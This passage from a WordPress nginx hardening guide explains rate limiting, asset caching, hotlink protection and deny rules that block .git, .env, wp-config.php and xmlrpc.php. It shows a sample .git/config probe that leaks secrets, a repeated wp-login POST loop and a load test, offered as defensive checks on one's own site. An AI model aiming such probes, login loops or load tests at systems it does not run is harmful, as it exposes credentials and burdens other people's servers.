- **With rate limit**: 5 attempts/minute → 50 attempts/10 minutes → much safer

**`burst=3 nodelay`**:

- User can make 3 rapid login attempts (fat-finger, wrong password)
- After 3 attempts, strict 5/minute limit applies

---

### API Rate Limiting

```nginx
location ~ ^/wp-json/ {
    limit_req zone=api burst=20 nodelay;

    try_files $uri $uri/ /index.php?$args;

    location ~ \.php$ {
        # ... PHP processing ...
        # Never cache API responses
        fastcgi_cache_bypass 1;
        fastcgi_no_cache 1;
    }
}
```

**WordPress REST API**: `/wp-json/wp/v2/posts`

**Why Rate Limit**:

- **Scraping**: Automated bots downloading entire site via API
- **Abuse**: Third-party apps making excessive requests

**`burst=20`**: Allow bursting (API calls come in batches)

- **Example**: Mobile app loads dashboard → 10 API calls at once
- Without burst: 9/10 calls blocked
- With burst=20: All 10 calls processed, then rate limit

---

### AJAX Rate Limiting

```nginx
location = /wp-admin/admin-ajax.php {
    limit_req zone=api burst=30 nodelay;

    # Never cache AJAX
    fastcgi_cache_bypass 1;
    fastcgi_no_cache 1;
}
```

**WordPress AJAX**: Used for:

- LearnDash progress tracking ("Mark lesson complete")
- Live search
- Comment posting
- Plugin actions

**`burst=30`**: Higher than API (LearnDash uses AJAX heavily)

- **Example**: User completes 5 quiz questions → 5 AJAX calls
- **Example**: Course navigation → 2-3 AJAX calls per click

---

## 10. Static Asset Caching

### Image Caching

```nginx
location ~* \.(jpg|jpeg|png|gif|ico|svg|webp)$ {
    expires 1y;
    add_header Cache-Control "public, immutable";
    access_log off;
    log_not_found off;
}
```

**`expires 1y`**: Cache for 1 year

- **Why so long?**: Images rarely change, and if they do, filename changes (e.g., `logo-v2.png`)
- **Browser**: Stores image locally, never requests again for 1 year

**`Cache-Control: public, immutable`**:

- **public**: CDNs/proxies can cache
- **immutable**: Don't revalidate even on refresh (images won't change)

**Performance Impact**:

```
First visit: Download 500KB images (2 seconds)
Second visit: Load from local cache (0 seconds)
```

**`access_log off`**: Don't log image requests

- **Why**: Images generate 80% of requests, logs get huge
- **Disk savings**: 10GB/day → 2GB/day

---

### CSS/JS Caching

```nginx
location ~* \.(css|js)$ {
    expires 1y;
    add_header Cache-Control "public, immutable";
    access_log off;
}
```

**Same as images**: 1-year cache

**Cache Busting**: WordPress/plugins use versioned URLs

```
style.css?ver=1.2.3  → Update version → Browser re-downloads
```

---

### Font Caching

```nginx
location ~* \.(woff|woff2|ttf|eot|otf)$ {
    expires 1y;
    add_header Cache-Control "public, immutable";
    add_header Access-Control-Allow-Origin "*";
    access_log off;
}
```

**`Access-Control-Allow-Origin: *`**: Allow cross-origin font loading

- **Why**: Fonts loaded from CSS files (cross-origin request)
- **Without CORS header**: Browser blocks font → broken text rendering

---

### Course Materials Caching

```nginx
location ~* \.(pdf|doc|docx|ppt|pptx|mp4|webm|mp3)$ {
    expires 30d;
    add_header Cache-Control "public";

    # Prevent hotlinking
    valid_referers none blocked yoursite.com;
    if ($invalid_referer) {
        return 403;
    }
}
```

**`expires 30d`**: Shorter than images (course materials update occasionally)

**Hotlinking Protection**:

```nginx
valid_referers none blocked yoursite.com;
```

**What is Hotlinking?**:

```html
<!-- evil.com embeds your video -->
<video src="https://yoursite.com/courses/premium-video.mp4"></video>
```

Your bandwidth → Their content

**`valid_referers`**:

- `none`: Direct access (OK - user downloading)
- `blocked`: No referer header (OK - some privacy tools)
- `yoursite.com`: Embedded on your site (OK)
- **Anything else**: Return 403 Forbidden

---

## 11. WordPress Security

### Hidden Files Protection

```nginx
location ~ /\. {
    deny all;
    access_log off;
}
```

**Blocks**: `/.git`, `/.env`, `/.htaccess`, `/.user.ini`

**Why Critical**:

```
GET /.git/config
# Response: Database password, API keys, secrets!
```

**`~ /\.`**: Regex matches any path with `/.`

- Matches: `/.git/`, `/.env`, `/wp-content/.htaccess`

---

### wp-config.php Protection

```nginx
location = /wp-config.php {
    deny all;
}
```

**wp-config.php contains**:

- Database credentials
- Authentication salts
- API keys

**Default WordPress**: PHP files in web root are protected by PHP (can't view source)
**Problem**: If PHP crashes, Nginx serves .php as text → credentials exposed!

**This rule**: Even if PHP down, wp-config.php always blocked

---

### XML-RPC Protection

```nginx
location = /xmlrpc.php {
    deny all;
    access_log off;
}
```

**XML-RPC**: Legacy WordPress API (before REST API)

**Why Disable**:

- **DDoS vector**: Pingback amplification attacks
- **Brute force**: No rate limiting built-in
- **Unused**: Modern WordPress uses REST API

**Compatibility**: Breaks:

- Jetpack plugin (use REST API instead)
- Old mobile apps (use WordPress app with REST API)

**If you need it**: Replace `deny all` with `limit_req zone=api`

---

### Readme/License Files

```nginx
location ~* ^/(readme|license)\.(html|txt)$ {
    deny all;
}
```

**Why Hide**:

- `readme.html` → Shows WordPress version → Attackers target known vulnerabilities
- `license.txt` → No sensitive data, but reveals WordPress installation

**Better**: Update WordPress regularly so version doesn't matter

---

## Performance Benchmarks

**With These Optimizations**:

- **Static assets**: Served in 5-10ms (cached)
- **Cached WordPress pages**: Served in 10-20ms (FastCGI cache HIT)
- **Uncached WordPress pages**: Served in 100-300ms (PHP + database)
- **First-time visitor**: Downloads 500KB → 150KB (gzip) in ~1 second
- **Returning visitor**: Loads from browser cache in ~0.2 seconds

**Security**:

- **Login brute force**: Blocked after 5 attempts/minute
- **DDoS**: Rate limiting + Cloudflare WAF
- **XSS/Clickjacking**: Blocked by CSP + security headers
- **Data exposure**: wp-config.php, .git, .env blocked

---

## Next Steps for Learning

1. **Monitor Cache Hit Rate**:

   ```bash
   # Check cache status
   curl -I https://yoursite.com | grep X-FastCGI-Cache

   # Monitor cache directory size
   du -sh /var/cache/nginx/wordpress
   ```

2. **Test Rate Limiting**:

   ```bash
   # Try 10 login requests (should block after 5)
   for i in {1..10}; do
     curl -X POST https://yoursite.com/wp-login.php
   done
   ```

3. **Verify Security Headers**:
   - Use <https://securityheaders.com>
   - Should get A or A+ grade

4. **Load Testing**:

   ```bash
   # Install Apache Bench
   sudo apt install apache2-utils

   # Test performance
   ab -n 1000 -c 10 https://yoursite.com/
   ```

5. **CSP Tuning**:
   - Check browser console for CSP violations
   - Add necessary domains to policy
   - Remove `unsafe-inline` if possible (use nonces)

---

## Resources

- **Nginx Documentation**: <http://nginx.org/en/docs/>
- **SSL Configuration**: <https://ssl-config.mozilla.org/>
- **Security Headers**: <https://owasp.org/www-project-secure-headers/>
- **Cloudflare IPs**: <https://www.cloudflare.com/ips/>
- **WordPress Performance**: <https://developer.wordpress.org/advanced-administration/performance/optimization/>

---

**Last Updated**: 2024-12-31
**Configuration File**: `ansible/roles/nginx_wordpress/templates/nginx-wordpress-optimized.conf.j2`
**Tested On**: Hetzner CX23 (x86) - 3,114 req/s, 32ms latency, A+ grade
